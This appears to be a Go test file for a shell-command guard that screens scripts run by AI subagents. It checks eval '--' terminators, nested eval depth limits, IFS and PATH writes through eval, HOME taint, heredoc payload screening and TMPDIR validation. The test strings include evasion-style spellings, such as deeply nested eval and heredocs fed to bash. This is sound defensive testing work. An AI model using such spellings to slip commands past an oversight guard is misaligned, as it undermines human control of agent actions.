		st, err := os.Stat("/dev/mqueue")
		if err != nil || !st.IsDir() || st.Mode().Perm() != 0o777 {
			t.Skipf("/dev/mqueue not a 1777 directory on this host: %v", err)
		}
		for _, td := range []string{"/dev/mqueue", "/dev/shm/..", "/dev/shm/../mqueue"} {
			t.Setenv("TMPDIR", td)
			if inheritedTmpdirValid() {
				t.Fatalf("inheritedTmpdirValid() = true under TMPDIR=%s, want false — %s resolves to a non-tmpfs pseudo filesystem regardless of how it is spelled", td, td)
			}
		}
	})
	t.Run("R18-M5-pos TMPDIR=/dev/shm itself keeps the tmpfs validity", func(t *testing.T) {
		st, err := os.Stat("/dev/shm")
		if err != nil || !st.IsDir() || st.Mode().Perm() != 0o777 || st.Mode()&os.ModeSticky == 0 {
			t.Skipf("/dev/shm not a 1777 tmpfs directory on this host: %v", err)
		}
		t.Setenv("TMPDIR", "/dev/shm")
		if !inheritedTmpdirValid() {
			t.Fatal("inheritedTmpdirValid() = false under TMPDIR=/dev/shm, want true (R17-S2 preserved)")
		}
	})

	// ---- R18-S1: a pending -c survives an independent later cluster ----
	t.Run("R18-S1 locateShellCSlot keeps the pending -c across -e", func(t *testing.T) {
		argv := []string{"bash", "-c", "-e", "echo ok"}
		idx, rawScript, glued, ok := locateShellCSlot(argv)
		text, has := unwrapShellArgv(argv)
		if !has || text != "echo ok" {
			t.Fatalf("unwrapShellArgv(%v) = (%q, %v), want (echo ok, true)", argv, text, has)
		}
		if !ok || glued || idx != 3 || rawScript != "echo ok" {
			t.Fatalf("locateShellCSlot(%v) = (%d, %q, glued=%v, ok=%v), want (3, echo ok, false, true) — the -e cluster must not drop the pending -c state", argv, idx, rawScript, glued, ok)
		}
	})
	t.Run("R18-S1-pos plain spellings keep locating the same word", func(t *testing.T) {
		for _, argv := range [][]string{
			{"sh", "-c", "echo ok"},
			{"bash", "-c", "--", "echo ok"},
		} {
			idx, rawScript, glued, ok := locateShellCSlot(argv)
			text, has := unwrapShellArgv(argv)
			if !ok || glued || !has || rawScript != text || argv[idx] != rawScript {
				t.Fatalf("locateShellCSlot(%v) = (%d, %q, glued=%v, ok=%v) vs unwrap=(%q,%v), want the same clean script word", argv, idx, rawScript, glued, ok, text, has)
			}
		}
	})

	// ---- R18-S2: nested pure-assignment segments consume no stdin ----
	t.Run("R18-S2 nested and flat X=1; bash agree on the pure shell rewrite", func(t *testing.T) {
		targets := stdinProgramTargetsWithEnv([]string{"bash", "-c", "X=1; bash"}, 0, envAssignments{}, "", callerIdentity{})
		_, nestedOK, nestedBash := stdinSingleShellTargetDialect(targets, false)
		if !nestedOK {
			t.Fatalf("nested 'bash -c \"X=1; bash\"' refuses the stdin rewrite, want ok=true — a pure assignment consumes no stdin exactly like the flat spelling")
		}
		flatEnvs, flatOK, flatBash := scriptAllowsLocalShellStdinPrepareDialect("X=1; bash", false, envAssignments{}, "", callerIdentity{})
		if !flatOK || len(flatEnvs) == 0 {
			t.Fatalf("flat 'X=1; bash' control broken: (envs=%d, ok=%v)", len(flatEnvs), flatOK)
		}
		if nestedBash != flatBash {
			t.Fatalf("nested bash=%v vs flat bash=%v — the two spellings must agree", nestedBash, flatBash)
		}
	})
	t.Run("R18-S2-neg nested real data consumers still refuse the rewrite", func(t *testing.T) {
		targets := stdinProgramTargetsWithEnv([]string{"bash", "-c", "cat; bash"}, 0, envAssignments{}, "", callerIdentity{})
		if _, nestedOK, _ := stdinSingleShellTargetDialect(targets, false); nestedOK {
			t.Fatal("nested 'bash -c \"cat; bash\"' permits a stdin rewrite, want ok=false — the inner cat consumes the stream as data (R17-M6 preserved)")
		}
	})

	// ---- R18-S3: /dev-adjacent ordinary directories are not pseudo roots ----
	t.Run("R18-S3 /development/cache is not a pseudo filesystem root", func(t *testing.T) {
		if tmpdirPseudoRoot("/development/cache") {
			t.Fatal("tmpdirPseudoRoot(/development/cache) = true, want false — sharing the /dev prefix does not make an ordinary development directory a device tree")
		}
		for _, td := range []string{"/dev", "/dev/mqueue", "/proc", "/proc/x", "/sys", "/dev/null"} {
			if !tmpdirPseudoRoot(td) {
				t.Fatalf("control broken: tmpdirPseudoRoot(%s) = false, want true", td)
			}
		}
		if tmpdirPseudoRoot("/dev/shm") || tmpdirPseudoRoot("/dev/shm/x") {
			t.Fatal("control broken: /dev/shm[/x] must stay out of the pseudo roots (R17-S2)")
		}
	})

	// ---- R18-S4: dash dialect rides into command substitutions ----
	t.Run("R18-S4 dash command substitution keeps the printf format word static", func(t *testing.T) {
		segs, ok := parseSubagentShellASTEnv("echo $(printf tag{red,blue})", 0, false, false, nil, callerIdentity{})
		if !ok || len(segs) == 0 {
			t.Fatalf("parse failed: ok=%v segs=%v", ok, segs)
		}
		found := false
		for _, seg := range segs {
			if len(seg.argv) == 2 && seg.argv[0] == "printf" {
				found = true
				if isDynamicArg(seg.argv[1]) {
					t.Fatalf("dash substitution printf format %q is dynamic, want the static literal tag{red,blue} — dash performs no brace expansion inside $(...) either", seg.argv[1])
				}
				if _, dyn := printfFmtWriteSlots(seg.argv[1], nil); dyn {
					t.Fatalf("printfFmtWriteSlots(%q, nil) dyn=true, want false (dash literal)", seg.argv[1])
				}
			}
		}
		if !found {
			t.Fatalf("no printf segment in %v — the substitution was not walked", segs)
		}
	})
	t.Run("R18-S4-neg bash command substitution keeps the brace encoding", func(t *testing.T) {
		segs, ok := parseSubagentShellASTEnv("echo $(printf tag{red,blue})", 0, false, true, nil, callerIdentity{})
		if !ok {
			t.Fatal("bash parse failed")
		}
		found := false
		for _, seg := range segs {
			if len(seg.argv) == 2 && seg.argv[0] == "printf" {
				found = true
				if _, dyn := printfFmtWriteSlots(seg.argv[1], nil); !dyn {
					t.Fatalf("printfFmtWriteSlots(%q, nil) dyn=false under bash, want true — bash really brace-expands inside $(...)", seg.argv[1])
				}
			}
		}
		if !found {
			t.Fatal("no printf segment under bash parse")
		}
	})

	// ---- R18-S5: the tainted-HOME tilde keeps its single-word proof ----
	t.Run("R18-S5 printf ~/banner under a rewritten HOME stays dyn=false", func(t *testing.T) {
		t.Setenv("HOME", "/home/parent")
		segs, ok := parseSubagentShellASTEnv("HOME=/custom/home; printf ~/banner", 0, false, true, nil, callerIdentity{})
		if !ok {
			t.Fatal("parse failed")
		}
		last := segs[len(segs)-1]
		if len(last.argv) != 2 || last.argv[0] != "printf" {
			t.Fatalf("last seg argv=%v, want [printf <tilde-word>]", last.argv)
		}
		if !isSingleWordOptionValue(last.argv[1]) {
			t.Fatalf("isSingleWordOptionValue(%q) = false, want true — bash tilde expansion never field-splits, so the word stays exactly one argv word even when its concrete path is unknowable", last.argv[1])
		}
		if _, dyn := printfFmtWriteSlots(last.argv[1], nil); dyn {
			t.Fatalf("printfFmtWriteSlots(%q, nil) dyn=true, want false — losing the concrete-path proof must not revoke the word-count proof", last.argv[1])
		}
		if _, ok := resolveNodeRunnerPathOpt(last.argv[1], "/opt/example"); ok {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) ok=true, want false — the service HOME must never stand in for the consuming shell's tainted HOME (R17-M4-b preserved)", last.argv[1])
		}
	})
	t.Run("R18-S5-pos untainted printf ~/banner keeps both proofs", func(t *testing.T) {
		t.Setenv("HOME", "/home/user")
		segs, ok := parseSubagentShellASTEnv("printf ~/banner", 0, false, true, nil, callerIdentity{})
		if !ok {
			t.Fatal("parse failed")
		}
		last := segs[len(segs)-1]
		if len(last.argv) != 2 {
			t.Fatalf("last seg argv=%v, want [printf <tilde-word>]", last.argv)
		}
		if _, dyn := printfFmtWriteSlots(last.argv[1], nil); dyn {
			t.Fatalf("printfFmtWriteSlots(%q, nil) dyn=true, want false (R14-S2 positive preserved)", last.argv[1])
		}
		cand, rok := resolveNodeRunnerPathOpt(last.argv[1], "/opt/example")
		if !rok || cand != "/home/user/banner" {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, %v), want (/home/user/banner, true)", last.argv[1], cand, rok)
		}
	})
}

// TestGuard_V622_OracleR19Probes pins the Oracle R19 audit closure
// (v6.2.2): the eval `--` option terminator, the static-eval PATH binding
// replication, the tilde expansion shapes, the pure-assignment environment
// propagation, the data-only heredoc payload exemption, the eval recursion
// depth budget and the raw byte-level adjacent double-glob contract. Every
// new-symbol reference uses LITERAL marker bytes so this file compiles
// verbatim on the pre-fix parent trees (R19-Oracle-S3).
func TestGuard_V622_OracleR19Probes(t *testing.T) {
	ifsFixture := func(t *testing.T, script string) (string, bool) {
		t.Helper()
		segs, ok := parseSubagentShellASTEnv(script, 0, false, true, nil, callerIdentity{})
		if !ok || len(segs) == 0 {
			t.Fatalf("parse %q failed: ok=%v segs=%v", script, ok, segs)
		}
		last := segs[len(segs)-1]
		if len(last.argv) < 2 {
			t.Fatalf("parse %q: last seg argv=%v, want at least 2 words", script, last.argv)
		}
		return last.argv[1], isSingleWordOptionValue(last.argv[1])
	}

	// ---- R19-M1: the eval builtin consumes its own `--` terminator ----
	t.Run("R19-M1 eval -- 'IFS=:' counts the IFS write exactly like the plain spelling", func(t *testing.T) {
		t.Setenv("HOME", "/home/red:blue")
		direct := "IFS=:; echo $HOME"
		plain := "eval 'IFS=:'; echo $HOME"
		dashdash := "eval -- 'IFS=:'; echo $HOME"
		dEnc, dOne := ifsFixture(t, direct)
		pEnc, pOne := ifsFixture(t, plain)
		ddEnc, ddOne := ifsFixture(t, dashdash)
		if dOne {
			t.Fatalf("control broken: direct IFS=: unquoted $HOME %q is single-word, want false", dEnc)
		}
		if ddEnc != pEnc || ddOne != pOne {
			t.Fatalf("eval -- 'IFS=:' encodes %q (single=%v) vs eval 'IFS=:' %q (single=%v) — bash consumes the -- terminator itself, so both spellings re-parse the SAME inner text and must agree exactly", ddEnc, ddOne, pEnc, pOne)
		}
		if ddOne {
			t.Fatalf("isSingleWordOptionValue(%q) = true after eval -- 'IFS=:', want false — the IFS write must reach the collector through the terminator", ddEnc)
		}
	})

	// ---- R19-M2: a static eval PATH write reproduces the direct binding ----
	mkFixture := func(t *testing.T, script string) string {
		t.Helper()
		t.Setenv("TMPDIR", "/tmp")
		t.Setenv("PATH", "/usr/bin:/bin")
		segs, ok := parseSubagentShellASTEnv(script, 0, false, true, nil, callerIdentity{})
		if !ok || len(segs) == 0 {
			t.Fatalf("parse %q failed: ok=%v", script, ok)
		}
		last := segs[len(segs)-1]
		if len(last.argv) < 2 {
			t.Fatalf("parse %q: last seg argv=%v", script, last.argv)
		}
		return last.argv[1]
	}
	t.Run("R19-M2 eval 'PATH=<no-mktemp>' revokes the abs-dq grant exactly like the direct write", func(t *testing.T) {
		direct := mkFixture(t, `PATH=/usr/local/sbin; echo "$(mktemp -d)"`)
		viaEval := mkFixture(t, `eval 'PATH=/usr/local/sbin'; echo "$(mktemp -d)"`)
		viaEvalDD := mkFixture(t, `eval -- 'PATH=/usr/local/sbin'; echo "$(mktemp -d)"`)
		if strings.Contains(direct, "__ctx_abspath_dq__") {
			t.Fatalf("control broken: direct PATH=/usr/local/sbin write %q keeps the abs-dq class — /usr/local/sbin is verified mktemp-less on this host", direct)
		}
		if viaEval != direct {
			t.Fatalf("eval spelling %q vs direct spelling %q — eval re-parses in the SAME shell, so its single static PATH write must bind exactly like the direct assignment (the effective PATH the substitution success proof resolves against)", viaEval, direct)
		}
		if strings.Contains(viaEval, "__ctx_abspath_dq__") {
			t.Fatalf("eval 'PATH=/usr/local/sbin' encoding %q carries the abs-dq class — the mktemp child cannot even exec under the eval-written PATH", viaEval)
		}
		if strings.Contains(viaEvalDD, "__ctx_abspath_dq__") || viaEvalDD != viaEval {
			t.Fatalf("eval -- 'PATH=...' encoding %q disagrees with %q — the -- terminator must not change the inner binding replication", viaEvalDD, viaEval)
		}
	})
	t.Run("R19-M2-pos eval 'PATH=<with-mktemp>' keeps the grant exactly like the direct write", func(t *testing.T) {
		direct := mkFixture(t, `PATH=/usr/bin:/bin; echo "$(mktemp -d)"`)
		viaEval := mkFixture(t, `eval 'PATH=/usr/bin:/bin'; echo "$(mktemp -d)"`)
		if !strings.Contains(direct, "__ctx_abspath_dq__") {
			t.Fatalf("control broken: direct PATH=/usr/bin:/bin %q lost the abs-dq class (/usr/bin/mktemp is executable)", direct)
		}
		if viaEval != direct {
			t.Fatalf("eval spelling %q vs direct spelling %q — a PATH carrying mktemp keeps the grant under both spellings", viaEval, direct)
		}
	})

	// ---- R19-M3: only real tilde expansions mint the tilde marker ----
	tildeFixture := func(t *testing.T, word string) (string, bool, string, bool) {
		t.Helper()
		w := parseBashSingleCmdWord(t, word, 1)
		s, static := blankSubCollector().wordToArg(w)
		cand, ok := resolveNodeRunnerPathOpt(s, "/opt/r19")
		return s, static, cand, ok
	}
	t.Run("R19-M3 quoted-slash tilde is a verbatim relative path, never a HOME expansion", func(t *testing.T) {
		t.Setenv("HOME", "/home/r19")
		expEnc, _, expCand, expOk := tildeFixture(t, `echo ~/"notes"`)
		if !expOk || expCand != "/home/r19/notes" {
			t.Fatalf("control broken: ~/\"notes\" resolves (%q, %v), want (/home/r19/notes, true) — the slash is UNQUOTED inside the first Lit, so bash really expands the tilde", expCand, expOk)
		}
		if !strings.Contains(expEnc, "\x00__ctx_tilde__\x00") {
			t.Fatalf("control broken: ~/\"notes\" encoding %q lost the tilde provenance marker", expEnc)
		}
		qEnc, qStatic, qCand, qOk := tildeFixture(t, `echo ~\/notes`)
		if strings.Contains(qEnc, "\x00__ctx_tilde__\x00") {
			t.Fatalf("~\\/notes encoding %q mints the tilde provenance — the slash is backslash-QUOTED, so bash never expands this tilde: the word is a verbatim cwd-relative path", qEnc)
		}
		if strings.Contains(qEnc, "__ctx_glob__") {
			t.Fatalf("~\\/notes encoding %q carries a glob marker — a verbatim literal tilde is plain static text (no expansion of any kind happens)", qEnc)
		}
		if !qStatic || qEnc != "~/notes" {
			t.Fatalf("~\\/notes encodes (%q, static=%v), want the static literal ~/notes exactly like the shell passes it", qEnc, qStatic)
		}
		if !qOk || qCand != "/opt/r19/~/notes" {
			t.Fatalf("~\\/notes resolves (%q, %v), want (/opt/r19/~/notes, true) — the verbatim word is a relative path under the caller cwd, never the service HOME", qCand, qOk)
		}
	})
	t.Run("R19-M3-pos login-name tilde stays dynamic without HOME provenance", func(t *testing.T) {
		t.Setenv("HOME", "/home/r19")
		uEnc, uStatic, uCand, uOk := tildeFixture(t, `echo ~root/notes`)
		if uStatic {
			t.Fatalf("~root/notes encodes static — the login lookup is dynamic, never static text")
		}
		if strings.Contains(uEnc, "\x00__ctx_tilde__\x00") {
			t.Fatalf("~root/notes encoding %q mints HOME provenance — ~user expands against the LOGIN DATABASE, never $HOME", uEnc)
		}
		if uOk {
			t.Fatalf("~root/notes resolves (%q, true), want ok=false — an unproven home directory can never be restored", uCand)
		}
	})

	// ---- R19-M4: pure-assignment segments propagate their environment ----
	t.Run("R19-M4 HOME=/home/r19; bash taints the consumer HOME exactly like the env prefix", func(t *testing.T) {
		t.Setenv("HOME", "/home/parent")
		stmtEnvs, stmtOK, _ := scriptAllowsLocalShellStdinPrepareDialect("HOME=/home/r19; bash", false, envAssignments{}, "", callerIdentity{})
		prefixEnvs, prefixOK, _ := scriptAllowsLocalShellStdinPrepareDialect("HOME=/home/r19 bash", false, envAssignments{}, "", callerIdentity{})
		if !prefixOK || len(prefixEnvs) == 0 {
			t.Fatalf("control broken: env-prefix spelling refuses the rewrite (ok=%v envs=%d)", prefixOK, len(prefixEnvs))
		}
		if !stmtOK || len(stmtEnvs) == 0 {
			t.Fatalf("statement spelling refuses the rewrite (ok=%v envs=%d), want ok=true like X=1 — the pure assignment consumes no stdin", stmtOK, len(stmtEnvs))
		}
		prefixTainted := prefixEnvs[0].taintedSentinelNames()["HOME"]
		stmtTainted := stmtEnvs[0].taintedSentinelNames()["HOME"]
		if stmtTainted != prefixTainted {
			t.Fatalf("HOME=/home/r19; bash env HOME-taint=%v vs HOME=/home/r19 bash %v — an exported HOME reassigned in the running shell is inherited by the consumer exactly like the env-prefix spelling", stmtTainted, prefixTainted)
		}
		if !stmtTainted {
			t.Fatal("HOME=/home/r19; bash target env does not taint HOME — the rewritten payload would be graded under the OLD HOME the consumer no longer sees")
		}
	})
	t.Run("R19-M4-n nested bash -c 'HOME=/home/r19; bash' propagates the assignment environment", func(t *testing.T) {
		t.Setenv("HOME", "/home/parent")
		targets := stdinProgramTargetsWithEnv([]string{"bash", "-c", "HOME=/home/r19; bash"}, 0, envAssignments{}, "", callerIdentity{})
		ctrl := stdinProgramTargetsWithEnv([]string{"bash", "-c", "HOME=/home/r19 bash"}, 0, envAssignments{}, "", callerIdentity{})
		if len(targets) == 0 || len(ctrl) == 0 {
			t.Fatalf("target projection broken: nested=%d ctrl=%d", len(targets), len(ctrl))
		}
		got := targets[len(targets)-1].envAs.taintedSentinelNames()["HOME"]
		want := ctrl[len(ctrl)-1].envAs.taintedSentinelNames()["HOME"]
		if got != want {
			t.Fatalf("nested statement spelling HOME-taint=%v vs nested env-prefix %v — the collectSegs skip must not drop the environment mutation", got, want)
		}
		if !got {
			t.Fatal("nested HOME=/home/r19; bash does not taint HOME on the consumer target")
		}
	})
	t.Run("R19-M4-pos neutral X=1; bash stays untainted and rewritable", func(t *testing.T) {
		t.Setenv("HOME", "/home/parent")
		envs, ok, _ := scriptAllowsLocalShellStdinPrepareDialect("X=1; bash", false, envAssignments{}, "", callerIdentity{})
		if !ok || len(envs) == 0 {
			t.Fatalf("X=1; bash refuses the rewrite (ok=%v), want true — neutral assignments never touch sentinel state (R18-S2 preserved)", ok)
		}
		if envs[0].taintedSentinelNames()["HOME"] || envs[0].taintedSentinelNames()["X"] {
			t.Fatalf("X=1 taints sentinel state %v, want empty — X is not a sentinel variable", envs[0].taintedSentinelNames())
		}
	})

	// ---- R19-S1: a pure-data heredoc consumer never faces the payload screen ----
	t.Run("R19-S1 cat heredoc with a plain $HOME expansion is not a dynamic code payload", func(t *testing.T) {
		seg := shellSegment{argv: []string{"cat"}, heredocText: []heredocBody{{text: "$HOME", dynamic: true}}}
		if hit := screenSegmentHeredocsDepth(seg, 's', 0, callerIdentity{}); hit != "" {
			t.Fatalf("screenSegmentHeredocsDepth(cat <<EOF $HOME) = %q, want empty — a pure data consumer reads the body as BYTES; no program target exists, so the dynamic code payload screen must not fire", hit)
		}
		segQ := shellSegment{argv: []string{"cat"}, heredocText: []heredocBody{{text: "just data", quoted: true}}}
		if hit := screenSegmentHeredocsDepth(segQ, 's', 0, callerIdentity{}); hit != "" {
			t.Fatalf("control broken: quoted data heredoc hits %q", hit)
		}
	})
	t.Run("R19-S1-neg program consumers keep the dynamic payload refusal", func(t *testing.T) {
		seg := shellSegment{argv: []string{"bash"}, heredocText: []heredocBody{{text: "$HOME", dynamic: true}}}
		if hit := screenSegmentHeredocsDepth(seg, 's', 0, callerIdentity{}); !strings.Contains(hit, "dynamic code payload") {
			t.Fatalf("screenSegmentHeredocsDepth(bash <<EOF $HOME) = %q, want substring %q — a shell reading its program from the stream faces the payload screen", hit, "dynamic code payload")
		}
	})

	// ---- R19-S2: the eval recursion shares the peel depth budget ----
	t.Run("R19-S2 eval nesting beyond peelChainMaxDepth stops parsing the leaf write", func(t *testing.T) {
		// Quoting a text one eval level deeper doubles the backslashes first
		// and then the quotes — inside double quotes \ is special before
		// \ " $ ` only, so this reproduces exactly the nesting bash itself
		// verifies (eval "eval \"zzleaf=1\"" really assigns zzleaf).
		nestEval := func(leaf string, levels int) string {
			inner := leaf
			for i := 0; i < levels; i++ {
				esc := strings.ReplaceAll(inner, `\`, `\\`)
				esc = strings.ReplaceAll(esc, `"`, `\"`)
				inner = `eval "` + esc + `"`
			}
			return inner
		}
		scanLeaf := func(t *testing.T, levels int) int {
			t.Helper()
			p := syntax.NewParser(syntax.Variant(syntax.LangBash))
			f, err := p.Parse(strings.NewReader(nestEval("zzleaf=1", levels)), "")
			if err != nil {
				t.Fatalf("parse: %v", err)
			}
			writes, _ := preScanVarMutations(f, false)
			return writes["zzleaf"]
		}
		shallow := scanLeaf(t, 3)
		if shallow != 1 {
			t.Fatalf("control broken: 3-level nested static eval leaf write count = %d, want 1 — shallow nesting stays inside the budget and replays exactly", shallow)
		}
		deep := scanLeaf(t, peelChainMaxDepth+1)
		if deep != 0 {
			t.Fatalf("peelChainMaxDepth+1-level nested eval leaf write count = %d, want 0 — beyond the depth budget the leaf is never parsed and only the conservative sentinel accounting applies", deep)
		}
	})

	// ---- R19-O1: the raw encoding carries the adjacent glob pair ----
	t.Run("R19-O1 a HOME-proven tilde brace word ends in the RAW adjacent glob pair", func(t *testing.T) {
		t.Setenv("HOME", "/home/user")
		w := parseBashSingleCmdWord(t, `echo ~/{red,blue}`, 1)
		s, _ := blankSubCollector().wordToArg(w)
		pair := "__ctx_glob____ctx_glob__"
		if !strings.Contains(s, pair) {
			t.Fatalf("subCollector.wordToArg(~/{red,blue}) = %q — the RAW encoding must carry the consecutive adjacent glob pair writeBraceExpansionMarkers guarantees, not only the tilde-stripped normalized form", s)
		}
		if !strings.HasSuffix(s, pair) {
			t.Fatalf("subCollector.wordToArg(~/{red,blue}) = %q — the adjacent pair must sit at the word tail (tilde provenance precedes the glob markers)", s)
		}
	})
}
